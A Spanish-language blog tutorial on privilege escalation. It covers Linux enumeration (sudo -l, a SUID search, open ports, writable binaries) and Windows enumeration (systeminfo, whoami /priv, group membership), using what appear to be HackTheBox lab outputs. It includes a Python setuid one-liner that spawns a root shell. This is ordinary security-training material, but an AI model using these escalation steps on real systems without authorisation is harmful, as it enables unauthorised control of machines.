---
date: 2021-11-15T01:14:05.000Z
layout: post
comments: true
title: Escalar privilegios
subtitle: 'para obtener acceso a root o a NT authority system'
description: >-
image: >-
  http://imgfz.com/i/pLYBOku.png
optimized_image: >-
  http://imgfz.com/i/pLYBOku.png
category: ciberseguridad
tags:
  - escalada
  - privilegios
  - root
  - NTauthoritysystem
  - hacking
author: Felipe Canales Cayuqueo
paginate: true
---

El usuario root en Linux es el usuario que posee mayor nivel de privilegios. De hecho, es el único que tiene privilegios sobre todo el sistema en su globalidad, así como el responsable de las tareas administrativas.

De este modo, cuando tu, o cualquier programa, quiera llevar a cabo una acción que requiera permisos de superusuario, de alguna manera se les tendrá que conceder o denegar estos privilegios. Pero la pregunta es si soy un usuario común, ¿puedo ser root, sin necesidad de contraseña?. La respuesta es que si con ciertos pasos que veremos a continuación aprovechando las vulnerabilidades que dejan los usuarios administradores.

# Linux

## Sudo

Una manera de escalar privilegios es a través del siguiente comando:

```bash
┌─[user@user]─[/]
└──╼ sudo -l
```

y ahí aparecerá un binario en el cuál podremos obtener acceso root siguiendo los pasos que nos indican en [GTFOBins](https://gtfobins.github.io/).

## SUID

Otra manera es buscando en /usr/bin, algún binario que contenga un permiso cuyo carácter sea ```s``` en lugar de ```x```.

```bash
┌─[user@user]─[/]
└──╼ ls -l /usr/bin/passwd
-rwsr-xr-x 1 root root 45420 May 17  2017 /usr/bin/passwd
```

Ahora también podemos buscar todos los binarios SUID a través de ```find```, con el siguiente comando:

```bash
┌─[user@user]─[/]
└──╼ find / -type f -user root -perm -4000 2>/dev/null
/var/htb/bin/emergency
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/traceroute6.iputils
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/mtr
/usr/sbin/pppd
/bin/ping
/bin/ping6
/bin/su
/bin/fusermount
/bin/mount
/bin/umount
```

## Puertos abiertos en la máquina

```bash
┌─[user@user]─[/]
└──╼ ss -lnpt
State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    Process                                                                         
LISTEN    0         128                0.0.0.0:23               0.0.0.0:*        users:(("python3",pid=829,fd=3))                                               
LISTEN    0         4096             127.0.0.1:631              0.0.0.0:*                                                                                       
LISTEN    0         4096                 [::1]:631                 [::]:*                                                                                       
```
En este caso hay una página web en la máquina la cual podremos visualizar por medio de [chisel](https://github.com/jpillora/chisel).

## Binarios

Otra forma de hacerlo es chequear que binarios contienen permisos de ejecución para un usuario:

```bash
┌─[user@user]─[/]
└──╼ ls -l /bin/ | grep rwxrwx
lrwxrwxrwx 1 root   root           8 Mar 13  2020 pydoc3 -> pydoc3.8
lrwxrwxrwx 1 root   root          12 Mar 13  2020 pygettext3 -> pygettext3.8
lrwxrwxrwx 1 root   root           9 Mar 13  2020 python3 -> python3.8
lrwxrwxrwx 1 root   root          16 Mar 13  2020 python3-config -> python3.8-config
lrwxrwxrwx 1 root   root          33 Jan 27  2021 python3.8-config -> x86_64-linux-gnu-python3.8-config
```

Aquí podríamos escalar privilegios a través de ```Python```, siguiendo los pasos que nos muestran en [GTFOBins](https://gtfobins.github.io/).

```bash
┌─[user@user]─[/]
└──╼ python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'

┌─[root@root]─[/]
└──╼ whoami
root
```

# Windows

## Información del sistema

En el caso de Windows se podría realizar a través de ```systeminfo```, para así poder averiguar vulnerabilidades del sistema:

```
C:\> systeminfo
systeminfo

Host Name:                 ARCTIC
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00477-001-0000421-84900
Original Install Date:     22/3/2017, 11:09:45   
System Boot Time:          29/12/2017, 3:34:21   
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2600 Mhz
                           [02]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2600 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 5/4/2016
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     1.024 MB
Available Physical Memory: 88 MB
Virtual Memory: Max Size:  2.048 MB
Virtual Memory: Available: 1.085 MB
Virtual Memory: In Use:    963 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.11
```

![1](http://imgfz.com/i/rFQc3RH.png)

## Permisos de usuario

Se pueden ver que privilegios tiene el usuario a través del siguiente comando:

```
C:\> whoami /priv
```

## Local Group

A través de ver en que grupo se encuentra el usuario se pueden encontrar vías potenciales para escalar privilegios:

```
C:\> net user <user>
```

Ejemplo:

```
C:\> net user svc-printer
User name                    svc-printer
Full Name                    SVCPrinter
Comment                      Service Account for Printer
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/26/2021 1:15:13 AM
Password expires             Never
Password changeable          5/27/2021 1:15:13 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   10/16/2021 10:01:36 AM

Logon hours allowed          All

Local Group Memberships      *Print Operators      *Remote Management Use
                             *Server Operators
Global Group memberships     *Domain Users
The command completed successfully.
```
Al ver que el usuario está en el grupo ```Server Operators```, se encuentra una vía donde poder realizar la escalada de privilegio.

